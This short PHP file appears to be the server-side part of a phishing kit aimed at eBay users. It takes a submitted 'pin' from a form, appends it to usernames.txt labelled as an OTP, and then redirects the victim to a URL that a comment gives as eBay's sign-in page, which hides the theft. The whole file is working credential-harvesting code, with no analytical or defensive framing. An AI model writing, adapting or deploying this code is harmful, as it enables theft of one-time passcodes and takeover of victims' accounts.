<?php
file_put_contents("usernames.txt", "OTP: " . $_POST["pin"] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.ebay.com/signin
header("Location: $url");
exit();
?>